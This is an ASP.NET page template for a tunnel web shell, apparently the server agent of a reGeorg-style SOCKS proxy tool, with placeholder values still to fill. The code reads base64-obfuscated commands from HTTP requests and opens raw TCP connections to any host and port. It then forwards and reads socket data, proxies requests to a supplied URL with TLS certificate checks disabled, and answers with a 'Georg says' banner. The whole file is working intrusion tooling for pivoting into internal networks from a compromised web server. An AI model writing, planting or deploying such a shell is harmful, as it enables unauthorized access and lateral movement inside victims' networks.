<%@ Page Language="C#" EnableSessionState="True"%>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Collections" %>
<%@ Import Namespace="System.IO.Compression" %>
<%@ Import Namespace="System.Net.Security" %>
<%@ Import Namespace="System.Security.Cryptography.X509Certificates" %>
<script runat="server">
    public String StrTr(string input, string frm, string to) {
        String r = "";
        for(int i=0; i< input.Length; i++) {
            int index = frm.IndexOf(input[i]);
            if(index != -1)
                r += to[index];
            else
                r += input[i];
        }
        return r;
    }

    private static byte[] readInputStream(Stream input, int len)
    {
        byte[] array = new byte[len];
        int num = 0;
        try
        {
            while ((num += input.Read(array, num, array.Length - num)) < array.Length)
            {
            }
            return array;
        }
        catch (IOException)
        {
            return array;
        }
    }
    public static Hashtable deserialize(byte[] requestData)
    {
        Hashtable hashtable = new Hashtable();
        MemoryStream stream = new MemoryStream(requestData);
        MemoryStream memoryStream2 = new MemoryStream();
        string text = null;
        byte[] array = new byte[4];
        try
        {
            while (true)
            {
                byte b = (byte)stream.ReadByte();
                switch (b)
                {
                    case 0x01:
                    {
                        text = Encoding.Default.GetString(memoryStream2.ToArray());
                        stream.Read(array, 0, array.Length);
                        int len = BitConverter.ToInt32(array, 0);
                        hashtable.Add(text, Encoding.Default.GetString((readInputStream(stream, len))));
                        memoryStream2.SetLength(0L);
                        break;
                    }
                    case 0x02:
                    {
                        text = Encoding.Default.GetString(memoryStream2.ToArray());
                        stream.Read(array, 0, array.Length);
                        int len = BitConverter.ToInt32(array, 0);
                        hashtable.Add(text, readInputStream(stream, len));
                        memoryStream2.SetLength(0L);
                        break;
                    }
                    case 0x03:
                    {
                        text = Encoding.Default.GetString(memoryStream2.ToArray());
                        stream.Read(array, 0, array.Length);
                        int len = BitConverter.ToInt32(array, 0);
                        hashtable.Add(text, BitConverter.ToInt32(readInputStream(stream, len),0));
                        memoryStream2.SetLength(0L);
                        break;
                    }

                    default:
                        memoryStream2.WriteByte(b);
                        break;
                    case byte.MaxValue:
                        memoryStream2.Dispose();
                        stream.Dispose();
                        stream.Dispose();
                        return hashtable;
                }
            }
        }
        catch (Exception)
        {
            return hashtable;
        }
    }
    public static byte[] serialize(Hashtable map)
    {
        IEnumerator enumerator = map.Keys.GetEnumerator();
        byte[] valueBytes = null;
        byte[] valueLength = null;
        MemoryStream memoryStream = new MemoryStream();
        while (enumerator.MoveNext())
        {
            try
            {
                string text = (string)enumerator.Current;
                object obj = map[text];
                byte[] keyBytes = Encoding.Default.GetBytes(text);
                memoryStream.Write(keyBytes, 0, keyBytes.Length);
                if (obj is string)
                {
                    memoryStream.WriteByte(0x01);
                    valueBytes = Encoding.Default.GetBytes((string)obj);
                }
                else if (obj is byte[])
                {
                    memoryStream.WriteByte(0x02);
                    valueBytes = (byte[])obj;
                }
                else if (obj is int)
                {
                    memoryStream.WriteByte(0x03);
                    valueBytes = BitConverter.GetBytes((int) obj);
                }
                valueLength = BitConverter.GetBytes(valueBytes.Length);
                memoryStream.Write(valueLength, 0, valueLength.Length);
                memoryStream.Write(valueBytes, 0, valueBytes.Length);
            }
            catch (Exception)
            {
            }
        }
        return memoryStream.ToArray();
    }

    private bool ServerCertificateValidationCallback(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslpolicyerrors)
    {
        return true;
    }
</script>
<%
    String en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    String de = "BASE64 CHARSLIST";
    try
    {
        byte[] requestBytes = Request.BinaryRead(Request.TotalBytes);

        requestBytes = Convert.FromBase64String( StrTr(System.Text.Encoding.Default.GetString(requestBytes), de, en));

        Hashtable request = deserialize(requestBytes);

        String rUrl = (string)request["X-REDIRECTURL"];
        if (rUrl != null){
            Uri u = new Uri(rUrl);
            WebRequest webRequest = WebRequest.Create(u);

            ServicePointManager.ServerCertificateValidationCallback = ServerCertificateValidationCallback;

            webRequest.Method = Request.HttpMethod;

            foreach (string key in Request.Headers)
            {
                try{
                    webRequest.Headers.Add(key, Request.Headers.Get(key));
                } catch (Exception e){}
            }

            try{
                request.Remove("X-REDIRECTURL");
                byte[] buff = Encoding.Default.GetBytes(StrTr(Convert.ToBase64String(serialize(request)), en, de));

                Stream body = webRequest.GetRequestStream();

                body.Write(buff, 0, buff.Length);

                body.Close();

            } catch (Exception e){}



            HttpWebResponse webResponse = (HttpWebResponse)webRequest.GetResponse();

            WebHeaderCollection webHeader = webResponse.Headers;
            Response.ClearHeaders();
            for (int i=0;i < webHeader.Count; i++)

            {

                string rkey = webHeader.GetKey(i);

                if (rkey != "Content-Length" && rkey != "Transfer-Encoding" && rkey != "Content-Encoding")
                {
                    Response.AddHeader(rkey,webHeader.Get(rkey));
                }

            }

            StreamReader repBody = null;
            if (webResponse.ContentEncoding.ToLower().Contains("gzip"))
            {
                repBody = new StreamReader(new GZipStream(webResponse.GetResponseStream(), CompressionMode.Decompress), Encoding.GetEncoding("UTF-8"));

            }
            else
            {
                repBody = new StreamReader(webResponse.GetResponseStream(), Encoding.GetEncoding("UTF-8"));
            }



            string rbody = repBody.ReadToEnd();

            Response.StatusCode = (int)webResponse.StatusCode;

            Response.Write(rbody);
            return;
        }
        Response.StatusCode = HTTPCODE;
        String cmd = (string)request["X-CMD"];
        if (cmd != null) {
            String mark = cmd.Substring(0,22);
            cmd = cmd.Substring(22);
            if (cmd == "CONNECT") {
                try {
                    String target = (string)request["X-HOST"];
                    int port = (int) request["X-PORT"];
                    IPAddress ip;
                    try {
                        ip = IPAddress.Parse(target);
                    } catch (Exception ex) {
                        IPHostEntry host = Dns.GetHostByName(target);
                        ip = host.AddressList[0];
                    }
                    System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);
                    Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    sender.Connect(remoteEP);
                    sender.Blocking = false;
                    Application.Add(mark, sender);

                    Hashtable result = new Hashtable();
                    result.Add("X-STATUS","OK");
                    Response.BinaryWrite(Encoding.Default.GetBytes(StrTr(Convert.ToBase64String(serialize(result)), en, de)));
                } catch (Exception ex) {
                    Hashtable result = new Hashtable();
                    result.Add("X-ERROR","Failed connecting to target");
                    result.Add("X-STATUS","FAIL");
                    Response.BinaryWrite(Encoding.Default.GetBytes(StrTr(Convert.ToBase64String(serialize(result)), en, de)));
                }
            } else if (cmd == "DISCONNECT") {
                try {
                    Socket s = (Socket)Application[mark];
                    s.Close();
                } catch (Exception ex){
                }
                Application.Remove(mark);
            } else if (cmd == "FORWARD") {
                Socket s = (Socket)Application[mark];
                try {
                    int buffLen = Request.ContentLength;
                    byte[] buff = new byte[buffLen];
                    int c = 0;
                    s.Send((byte[])request["X-DATA"]);
                    Hashtable result = new Hashtable();
                    result.Add("X-STATUS","OK");
                    Response.BinaryWrite(Encoding.Default.GetBytes(StrTr(Convert.ToBase64String(serialize(result)), en, de)));
                } catch (Exception ex) {
                    Hashtable result = new Hashtable();
                    result.Add("X-ERROR","POST request read filed");
                    result.Add("X-STATUS","FAIL");
                    Response.BinaryWrite(Encoding.Default.GetBytes(StrTr(Convert.ToBase64String(serialize(result)), en, de)));
                }
            } else if (cmd == "READ") {
                try {
                    Socket s = (Socket)Application[mark];
                    byte[] readBuff = new byte[READBUF];
                    int maxRead = MAXREADSIZE;
                    int readLen = 0;
                    try {
                        int c = s.Receive(readBuff);
                        MemoryStream membuf = new MemoryStream();
                        while (c > 0) {
                            byte[] newBuff = new byte[c];
                            System.Buffer.BlockCopy(readBuff, 0, newBuff, 0, c);
                            membuf.Write(newBuff,0,c);
                            readLen += c;
                            if (c < READBUF || readLen >= maxRead)
                                break;
                            c = s.Receive(readBuff);
                        }
                        Hashtable result = new Hashtable();
                        result.Add("X-STATUS","OK");
                        result.Add("X-DATA",membuf.ToArray());
                        Response.BinaryWrite(Encoding.Default.GetBytes(StrTr(Convert.ToBase64String(serialize(result)), en, de)));
                    } catch (SocketException soex) {
                        Hashtable result = new Hashtable();
                        result.Add("X-STATUS","OK");
                        result.Add("X-DATA",new byte[0]);
                        Response.BinaryWrite(Encoding.Default.GetBytes(StrTr(Convert.ToBase64String(serialize(result)), en, de)));
                    }
                } catch (Exception ex) {
                    Hashtable result = new Hashtable();
                    result.Add("X-STATUS","OK");
                    result.Add("X-DATA",new byte[0]);
                    Response.BinaryWrite(Encoding.Default.GetBytes(StrTr(Convert.ToBase64String(serialize(result)), en, de)));
                }
            }
        } else {
            Response.Write("Georg says, 'All seems fine'");
        }
    } catch (Exception ex) {
        Hashtable result = new Hashtable();
        result.Add("X-STATUS","FAIL");
        Response.BinaryWrite(Encoding.Default.GetBytes(StrTr(Convert.ToBase64String(serialize(result)), en, de)));
    }
%>
